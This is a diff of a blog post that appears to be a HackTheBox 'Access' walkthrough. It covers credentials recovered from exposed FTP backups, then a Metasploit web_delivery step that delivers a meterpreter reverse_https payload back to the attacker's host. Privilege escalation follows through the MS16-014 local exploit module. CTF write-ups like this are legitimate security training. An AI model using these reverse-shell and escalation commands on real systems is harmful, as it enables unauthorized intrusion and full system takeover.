@@ -3,7 +3,6 @@ layout: post
 title: HackTheBox - Access
 categories: htb
 permalink: /htb-access
-
 ---
 
 ![BoxInfo]({{ site.baseurl }}/assets/htb-images/access/infocard.png)
@@ -15,7 +14,7 @@ As always, I am starting off with an Nmap scan to determine open ports. After th
 So it looked like that RDP and telnet are open, FTP allows for anonymous login. When I tried to access the FTP service from the browser It seems that i cannot do it, but when I tried to login from the terminal it allowed me ! I was prompted for username so I just used Anonymous for user and blank password, since the header of Nmap output, showed that FTP allows for anonymous access ! There were 2 directories inside FTP service: Backups and Engineer. Backups folder contained a file called "backup.mdb" and folder Engineer contained a zip file "Account Access.zip". I ran strings command on backups.mdb and I found
 several interesting things:
 
-admin , administrator, engineer, backup_admin, access4u@security
+> admin , administrator, engineer, backup_admin, access4u@security
 
 The last one access4u@security looked more like a password and so I passed it to the zip file: Access Control.zip and it worked so i extracted the file inside. Now the file inside the compressed file had an extension ".pst" so I used a tool called readpst to convert the file and read it with any kind of editor. After I opened the file, I found some information about an account on the system.
 
@@ -29,23 +28,27 @@ After enumerating the system, I didn't find anything, so I decide to upload a wi
 
 As for the enumeration script, I used Sherlock (made by RastaMouse). This script is going to check for missing patches & software as well as show possible ways of privilege escalation. When the script finished the enumeration, I saw that script has found a common way of privilege escalation in Windows, Secondary Logon Handle, CVE: MS16-032! Once I tested the exploit it did not work, so I would assume at this point that the system was patched against this exploit.
 
+```
  In Metasploit
  $ use multi/script/web_delivery
  $ set payload windows/x64/meterpreter/reverse_https
+```
 
  Had some error with this exploit saying its not compatible so running this command fixed it !
 
+```
  $ set target 2 ----> Sets payload delivery via Powershell
  $ set LHOST  
  $ set LPORT <>
  $ exploit -j
+```
 
 Copy command from metasploit & run on target machine !
 
 ![Payload_Delivery]({{ site.baseurl }}/assets/htb-images/access/Payload_Delivery.png)
 
 I now had 2 shells as user 'security', one telnet & one meterpreter session. As MS16-032 did not worked,I have checked to see the closest exploit to date to MS16-032 and it was the MS16-014. Metasploit has a post exploitation module which uses this exploit to escalate privileges.
-
+```
  In Metasploit after I get shell !
 
  $ meterpreter> background
@@ -53,11 +56,12 @@ I now had 2 shells as user 'security', one telnet & one meterpreter session. As 
  $ use exploit/windows/local/ms16_014_wmi_recv_notif
  $ set session 1
  $ exploit
-
+```
 ![MS16-014MSFpostModule]({{ site.baseurl }}/assets/htb-images/access/MS16-014MSFpostModule.png)
 
 This privilege escalation exploit spawned me in shell session instead of in meterpreter as NT_AUTHORITY user, so I quickly changed it to a meterpreter session using a post module.
 
+```
  Switch from Shell -> Meterpreter
 
  $ctrl + z
@@ -66,6 +70,7 @@ This privilege escalation exploit spawned me in shell session instead of in mete
  $ set LPORT <>
  $ set session 2
  $ exploit
+```
 
 ![System-Meterpreter]({{ site.baseurl }}/assets/htb-images/access/System-Meterpreter.png)
 
